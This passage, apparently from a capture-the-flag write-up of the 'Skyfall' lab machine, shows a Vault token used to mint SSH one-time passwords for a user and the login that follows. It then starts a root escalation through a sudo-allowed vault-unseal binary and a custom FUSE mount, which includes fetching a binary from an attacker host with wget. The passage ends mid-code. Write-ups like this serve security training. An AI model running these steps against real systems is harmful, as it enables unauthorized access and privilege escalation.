</span></span></span></code></pre></div><p>I can see the field &ldquo;username&rdquo;, we can then try to request for the user <code>askyy</code> (that we have already impersonated):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --request POST --header &#34;X-Vault-Token: hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE&#34; http://prd23-vault-internal.skyfall.htb/v1/ssh/creds/dev_otp_key_role -d &#39;{&#34;ip&#34;:&#34;10.10.11.254&#34;, &#34;username&#34;:&#34;askyy&#34;}&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;request_id&#34;: &#34;89eb700b-8467-0aea-6d4c-eaf51452fcd2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_id&#34;: &#34;ssh/creds/dev_otp_key_role/QG1uenKuKgVECQszJHwfnZFH&#34;,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;renewable&#34;: false,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;lease_duration&#34;: 2764800,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;data&#34;: {
</span></span></span><span class=line><span class=cl><span class=go>    &#34;ip&#34;: &#34;10.10.11.254&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key&#34;: &#34;40bafb97-ebe2-c3c7-1a13-8f3cc1903a47&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;key_type&#34;: &#34;otp&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;port&#34;: 22,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;username&#34;: &#34;askyy&#34;
</span></span></span><span class=line><span class=cl><span class=go>  },
</span></span></span><span class=line><span class=cl><span class=go>  &#34;wrap_info&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;warnings&#34;: null,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;auth&#34;: null
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>where we have a key: <code>40bafb97-ebe2-c3c7-1a13-8f3cc1903a47</code> (this key will be different every time we run the command).</p><p>Finally, if we use this generated key as password to log in via <code>SSH</code> as <code>askyy</code> user this also works:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -o stricthostkeychecking=no askyy@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>(askyy@10.10.11.254) Password: 40bafb97-ebe2-c3c7-1a13-8f3cc1903a47
</span></span></span><span class=line><span class=cl><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Sun Sep  1 00:49:19 2024 from 10.10.16.3
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:~$
</span></span></span></code></pre></div><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Checking what commands we can run as <code>sudo</code> we can run one command that does not require password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for askyy on skyfall:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User askyy may run the following commands on skyfall:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) NOPASSWD: /root/vault/vault-unseal -c /etc/vault-unseal.yaml
</span></span></span></code></pre></div><p>Checking the command options:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -h
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Usage:
</span></span></span><span class=line><span class=cl><span class=go>  vault-unseal [OPTIONS]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Application Options:
</span></span></span><span class=line><span class=cl><span class=go>  -v, --verbose        enable verbose output
</span></span></span><span class=line><span class=cl><span class=go>  -d, --debug          enable debugging output to file (extra logging)
</span></span></span><span class=line><span class=cl><span class=go>  -c, --config=PATH    path to configuration file
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Help Options:
</span></span></span><span class=line><span class=cl><span class=go>  -h, --help           Show this help message
</span></span></span></code></pre></div><p>Even if we cannot read that the script does, we can find <a href=https://github.com/lrstanley/vault-unseal class=external-link target=_blank rel=noopener><code>Vault Unseal</code> Github repository</a> that is, apparently, the same program running with <code>sudo</code>. It is a program used to unseal values for <code>Hashicorp Vault</code>.</p><p>When I entered in the account I checked if we had files interesting files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 32
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 askyy askyy 4096 Jan 22 14:46 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Jan 19 21:33 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Jan 18 10:32 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root  askyy   33 May 19 22:17 user.txt
</span></span></span></code></pre></div><p>but after running the commands with <code>sudo</code>, and providing <code>-d</code> flag option, I note that a file called <code>debug.log</code> was created, which is owned by <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>[-] Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>[+] Vault sealed: false
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:~$ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 36
</span></span></span><span class=line><span class=cl><span class=go>drwxr-x--- 4 askyy askyy 4096 May 20 00:59 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 3 root  root  4096 Jan 19 21:33 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx 1 askyy askyy    9 Nov  9  2023 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  220 Jan  6  2022 .bash_logout
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy 3771 Nov  9  2023 .bashrc
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Oct  9  2023 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r-- 1 askyy askyy  807 Jan  6  2022 .profile
</span></span></span><span class=line><span class=cl><span class=go>drwx------ 2 askyy askyy 4096 Jan 18 10:32 .ssh
</span></span></span><span class=line><span class=cl><span class=go>-rw------- 1 root  root   590 May 20 00:59 debug.log
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root  askyy   33 May 19 22:17 user.txt
</span></span></span></code></pre></div><p>However, I cannot read this file as was shown previously by the permissions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cat debug.log
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cat: debug.log: Permission denied
</span></span></span></code></pre></div><p>A way to attempt to read this file is to use <code>libfuse</code> system:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>libfuse</code> provides the reference implementation for communicating with the <code>FUSE</code> kernel module. A <code>FUSE</code> file system is typically implemented as a standalone application that links with <code>libfuse</code>. <code>libfuse</code> provides functions to mount the file system, unmount it, read requests from the kernel, and send responses back.</div></div><p>For this we can check, for example, <code>/etc/fuse.conf</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cat /etc/fuse.conf
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> The file /etc/fuse.conf allows <span class=k>for</span> the following parameters:
</span></span><span class=line><span class=cl><span class=gp>#</span>
</span></span><span class=line><span class=cl><span class=c1># user_allow_other - Using the allow_other mount option works fine as root, in</span>
</span></span><span class=line><span class=cl><span class=gp>#</span> order to have it work as user you need user_allow_other in /etc/fuse.conf as
</span></span><span class=line><span class=cl><span class=gp>#</span> well. <span class=o>(</span>This option allows users to use the allow_other option.<span class=o>)</span> You need
</span></span><span class=line><span class=cl><span class=gp>#</span> allow_other <span class=k>if</span> you want users other than the owner to access a mounted fuse.
</span></span><span class=line><span class=cl><span class=gp>#</span> This option must appear on a line by itself. There is no value, just the
</span></span><span class=line><span class=cl><span class=gp>#</span> presence of the option.
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>user_allow_other
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span> <span class=nv>mount_max</span> <span class=o>=</span> n - this option sets the maximum number of mounts.
</span></span><span class=line><span class=cl><span class=gp>#</span> Currently <span class=o>(</span>2014<span class=o>)</span> it must be typed exactly as shown
</span></span><span class=line><span class=cl><span class=gp>#</span> <span class=o>(</span>with a single space before and after the equals sign<span class=o>)</span>.
</span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span><span class=nv>mount_max</span> <span class=o>=</span> <span class=m>1000</span>
</span></span></code></pre></div><p>where the option <code>user_allow_other</code> is uncommented (which means it is enabled), allowing other users to write to our file system.</p><p>Now, we could look for many ways to use <code>FUSE</code>, but one of the most &ldquo;secure&rdquo; ways is to use static binaries. For example, if we use a static binary built in <code>C</code> or <code>Go</code>, if it runs in our machine and does not have strong dependencies on libraries, it should run in our machine as well as in other <code>Linux</code> machines like the victim target. We finally find <code>go-fuse</code> (that can be downloaded from <a href=https://github.com/hanwen/go-fuse class=external-link target=_blank rel=noopener>its Github repository</a>). More specifically, if we go to <code>example</code> folder and then we use <code>memfs</code> it will allow us to create in-file memory file system.</p><p>For this, download the repository, go to its <code>example/memfs</code> directory and build the binary:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ git clone https://github.com/hanwen/go-fuse.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;go-fuse&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 13206, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (3712/3712), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (764/764), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 13206 (delta 3186), reused 3000 (delta 2946), pack-reused 9494 (from 1)
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (13206/13206), 3.92 MiB | 7.17 MiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (8759/8759), done.
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ cd go-fuse/example/memfs
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x 4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x 4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x  957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ go build
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>go: downloading golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a
</span></span></span><span class=line><span class=cl><span class=go>‚ùØ ls -la
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 3216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x    4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x    4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x     957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 gunzf0x gunzf0x 3280265 Aug 31 20:01 memfs
</span></span></span></code></pre></div><p>Start a <code>Python</code> <code>HTTP</code> server on port <code>8080</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls -la &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 3216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x  2 gunzf0x gunzf0x    4096 Aug 31 20:01 .
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x 10 gunzf0x gunzf0x    4096 Aug 31 20:01 ..
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--  1 gunzf0x gunzf0x     957 Aug 31 20:01 main.go
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 gunzf0x gunzf0x 3280265 Aug 31 20:01 memfs
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>and download it on the victim machine with <code>wget</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ wget http://10.10.16.3:8080/memfs -O /dev/shm/memfs
</span></span></span><span class=line><span class=cl><span class=go>--2024-09-01 00:12:21--  http://10.10.16.3:8080/memfs
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.3:8080... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 3280265 (3.1M) [application/octet-stream]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äò/dev/shm/memfs‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/dev/shm/memfs                             100%[=======================================================================================&gt;]   3.13M   722KB/s    in 7.6s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:~$ chmod +x /dev/shm/memfs
</span></span></span></code></pre></div><p>And start a mount using the exported binary into the victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:~$ cd /dev/shm
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm$ ./memfs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>usage: main MOUNTPOINT BACKING-PREFIX
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ mkdir output
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm$ ./memfs output test
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mounted!
</span></span></span></code></pre></div><p>Now, log in in another <code>SSH</code> session with the trick shows previously and run the command with <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm/output$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/09/01 01:04:22 open debug.log: permission denied
</span></span></span></code></pre></div><p>This is due to our current application (the compiled binary <code>memfs</code>) is not allowing other users to write into our mount.</p><p>So we have to modify the code for <code>memfs</code> to allow it. Before that, remember to unmount the temporal mount running <code>fusermount</code> (remember to go out/exit from the directory <code>output</code> in all the sessions we have, otherwise it will raise an error <code>fusermount: failed to unmount /dev/shm/output: Device or resource busy</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ fusermount -u output
</span></span></span></code></pre></div><p>If we read the source code <code>main.go</code> from <code>examples/memfs</code> from <code>go-fuse</code> repository we can see:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// Copyright 2016 the Go-FUSE Authors. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=c1>// Use of this source code is governed by a BSD-style
</span></span></span><span class=line><span class=cl><span class=c1>// license that can be found in the LICENSE file.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// Mounts MemNodeFs for testing purposes.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse/nodefs&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Scans the arg list and sets up flags
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>debug</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Bool</span><span class=p>(</span><span class=s>&#34;debug&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;print debugging messages.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>NArg</span><span class=p>()</span> <span class=p>&lt;</span> <span class=mi>2</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=c1>// TODO - where to get program name?
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;usage: main MOUNTPOINT BACKING-PREFIX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>mountPoint</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>prefix</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>root</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewMemNodeFSRoot</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>conn</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewFileSystemConnector</span><span class=p>(</span><span class=nx>root</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>fuse</span><span class=p>.</span><span class=nf>NewServer</span><span class=p>(</span><span class=nx>conn</span><span class=p>.</span><span class=nf>RawFS</span><span class=p>(),</span> <span class=nx>mountPoint</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>fuse</span><span class=p>.</span><span class=nx>MountOptions</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>Debug</span><span class=p>:</span> <span class=o>*</span><span class=nx>debug</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Mount fail: %v\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Mounted!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>.</span><span class=nf>Serve</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>In the code there is a variable setting options <code>fuse.MountOptions</code>. If we check the code for this <code>fuse</code> library (<code>fuse/api.go</code>) we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=p>&lt;</span><span class=nx>SNIP</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>MountOptions</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>AllowOther</span> <span class=kt>bool</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Options are passed as -o string to fusermount.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Options</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Default is _DEFAULT_BACKGROUND_TASKS, 12.  This numbers
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// controls the allowed number of requests that relate to
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// async I/O.  Concurrency for synchronous I/O is not limited.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>MaxBackground</span> <span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nx>SNIP</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>where I can see the option <code>AllowOther</code>, that is a boolean variable. So we add this variable in the original code to be <code>true</code>. Therefore, the code for <code>main.go</code> now is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// Copyright 2016 the Go-FUSE Authors. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=c1>// Use of this source code is governed by a BSD-style
</span></span></span><span class=line><span class=cl><span class=c1>// license that can be found in the LICENSE file.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// Mounts MemNodeFs for testing purposes.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse/nodefs&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Scans the arg list and sets up flags
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>debug</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Bool</span><span class=p>(</span><span class=s>&#34;debug&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;print debugging messages.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>NArg</span><span class=p>()</span> <span class=p>&lt;</span> <span class=mi>2</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=c1>// TODO - where to get program name?
